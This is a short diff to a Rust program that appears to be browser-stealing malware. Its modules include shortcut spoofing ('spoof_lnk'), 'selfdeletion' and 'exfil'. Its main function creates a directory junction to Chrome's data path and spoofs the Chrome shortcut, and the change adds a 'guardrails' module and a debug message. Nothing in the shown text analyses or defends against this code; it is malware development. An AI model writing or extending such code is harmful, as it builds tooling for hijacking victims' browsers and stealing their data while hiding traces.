@@ -10,6 +10,8 @@ use shortcut::{spoof_lnk, restore_lnk};
 mod browser;
 use selfdeletion;
 
+mod guardrails;
+
 mod exfil;
 
 #[tokio::main]
@@ -26,13 +28,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[*] Checking if junction exists...");
     if !junction::exists(&junc_path)? {
         #[cfg(feature = "debug")]
+        println!("[*] Checking guardrails...");
+
+        #[cfg(feature = "debug")]
         println!("[*] Creating dir junction...");
         junction::create(chrome_data_path, &junc_path)?;
 
         #[cfg(feature = "debug")]
         println!("[*] Spoofing Chrome shortcut...");
         let _ = spoof_lnk(&username)?;
-
     } else {
         #[cfg(feature = "debug")]
         println!("[*] Starting browser...");
